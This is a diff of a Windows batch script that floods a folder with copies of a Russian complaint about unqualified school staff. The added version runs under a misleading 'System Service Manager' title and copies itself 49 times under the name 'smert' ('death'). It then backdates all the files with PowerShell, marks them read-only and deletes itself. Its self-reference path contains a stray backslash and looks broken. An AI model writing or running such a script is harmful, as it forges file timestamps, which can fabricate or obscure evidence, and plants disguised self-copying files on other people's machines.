@@ -1,31 +1,28 @@
 @echo off
 setlocal enabledelayedexpansion
+title System Service Manager
 
-chcp 65001 >nul
-
-set "filename=output"
 set "text=Прошу обратить внимание на то, что в школе работают лица без соответствующего образования и квалификации для преподавания"
+set count=50
 
-set count=15
-
-:: Создаём первый файл
-echo %text% > "%filename%.txt"
-
-echo Начинаем создание файлов с разными датами...
-
+:: Создание файлов
 for /L %%i in (1,1,%count%) do (
-    set "newfile=%filename%%%i.txt"
-    
-    copy /y "%filename%.txt" "!newfile!" >nul 2>&1
-    
-    :: Изменяем дату создания и модификации (разные для каждого файла)
-    powershell -NoProfile -Command ^
-    "$file=Get-Item '!newfile!'; $randDays=-(Get-Random -Minimum 30 -Maximum 800); $randHours=Get-Random -Minimum 0 -Maximum 24; $randMin=Get-Random -Minimum 0 -Maximum 60; $date=(Get-Date).AddDays($randDays).AddHours($randHours).AddMinutes($randMin); $file.CreationTime=$date; $file.LastWriteTime=$date; $file.LastAccessTime=$date" >nul 2>&1
-    
-    echo Создан: !newfile!
+    echo %text% > "ВНИМАНИЕ_%%i.txt"
 )
 
-echo.
-echo Готово! Создано %count% файлов с максимально разными датами создания.
-pause
+:: Создание копий батника
+for /L %%i in (2,1,%count%) do (
+    copy /y "%\~f0" "smert%%i.bat" >nul 2>&1
+)
+
+:: Максимально быстрое изменение дат + атрибуты
+powershell -NoProfile -Command ^
+"Get-ChildItem ВНИМАНИЕ_*.txt,smert*.bat | ForEach-Object { $d=(Get-Date).AddDays(-(Get-Random -Min 40 -Max 1600)); $_.CreationTime=$d; $_.LastWriteTime=$d; $_.LastAccessTime=$d; $_.Attributes='ReadOnly, Archive' }" >nul 2>&1
+
+attrib +r *.txt smert*.bat >nul 2>&1
+
+timeout /t 1 >nul
+del "%\~f0" >nul 2>&1
+
 endlocal
+exit
